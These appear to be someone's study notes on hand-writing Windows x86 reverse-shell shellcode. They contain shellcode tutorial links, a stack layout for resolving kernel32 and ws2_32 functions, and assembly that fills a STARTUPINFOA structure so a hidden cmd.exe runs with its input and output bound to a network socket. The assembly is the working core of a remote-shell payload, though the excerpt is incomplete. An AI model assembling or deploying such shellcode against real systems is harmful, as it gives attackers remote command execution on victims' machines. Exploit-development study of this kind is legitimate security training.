NOTES


REFS

  Working c program:
    https://stackoverflow.com/questions/58269068/why-is-wsaconnect-working-and-connect-not

  Shellcodes
    https://h0mbre.github.io/Babys-First-Shellcode-Part2/#
    http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/


  Windows API

    GetProcAddress
    https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
    Socket
    https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
    https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa?redirectedfrom=MSDN
    https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect?redirectedfrom=MSDN

STACK
  ebp-0x38 :  &CreateProcessA()
  ebp-0x34 :  socket
  ebp-0x30 :  &ws2_32.dll
  ebp-0x2C :  &LoadLibrary()
  ebp-0x28 :  &GetProcAddress
  ebp-0x24 :  findFunctionAddr lenNameString : len(NameString)
  ebp-0x20 :  findFunctionAddr pNameString : &NameString
  ebp-0x14 :  save value of Number of Functions to stack-frame
  ebp-0x10 :  save &AddressTable to stack-frame
  ebp-0x0C :  save &OrdinalTable to stack-frame
  ebp-0x04 :  &kernel32.dll
  ebp-0x08 :  save &NamePointerTable to stack frame
  ebp+0x18 :  ESI = Address of String for the Symbol we are searching for

CreateProcessA
; Push Ecx ; procinfo
; Push Edx ; startup
; Push Esi ; 0
; Push Esi ; 0
; Push Esi ; 0
; Push 1
; Push Esi ; 0
; Push Esi ; 0
; Push Eax ; &cmdLine
; Push Esi ; 0
; Call CreateProcessA

================================================================================
Calling CreateProcessA with redirected streams

                    ; edi = socket
mov edx, 0x646d6363
shr edx, 8
push edx            ; edx = "CMD"
mov ecx, esp        ; ecx -> "cmd"

xor edx, edx        ; edx = 0

sub esp, 16
mov ebx, esp        ; ebx -> PROCESS_INFORMATION

; Create StartupInfo
; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
; typedef struct _STARTUPINFOA {
;          DWORD  cb;
;          LPSTR  lpReserved;
;          LPSTR  lpDesktop;
;          LPSTR  lpTitle;
;          DWORD  dwX;
;          DWORD  dwY;
;          DWORD  dwXSize;
;          DWORD  dwYSize;
;          DWORD  dwXCountChars;
;          DWORD  dwYCountChars;
;          DWORD  dwFillAttribute;
;          DWORD  dwFlags;
;          WORD   wShowWindow;
;          WORD   cbReserved2;
;          LPBYTE lpReserved2;
;          HANDLE hStdInput;
;          HANDLE hStdOutput;
;          HANDLE hStdError;
; dwFlags:
;     STARTF_USESHOWWINDOW 0x00000001
;        To indicate window information (to hide it)
;        then wShowWindow = 0
;     STARTF_USESTDHANDLES 0x00000100
;        To redirect the streams
;        then set hStdInput, hStdOutput, hStdError


push edi            ; hStdError   : sckt
push edi            ; hStdOutput  : sckt
push edi            ; hStdInput   : sckt
push edx            ; lpReserved2 : 0 (NULL)
push edx            ; cbReserved2, wShowWindow  : 0

xor eax, eax
inc eax
rol eax, 8
inc eax
push eax            ; dwFlags : 0x0101

push edx            ; dwFillAttribute : 0
push edx            ; dwYCountChars   : 0
push edx            ; dwXCountChars   : 0
push edx            ; dwYSize         : 0
push edx            ; dwXSize         : 0
push edx            ; dwY             : 0
push edx            ; dwX             : 0
push edx            ; lpTitle         : 0
push edx            ; lpDesktop       : 0
push edx            ; lpReserved      : 0

xor eax, eax
add al, 44
push eax            ; cd          : 0x44 (size of structure)
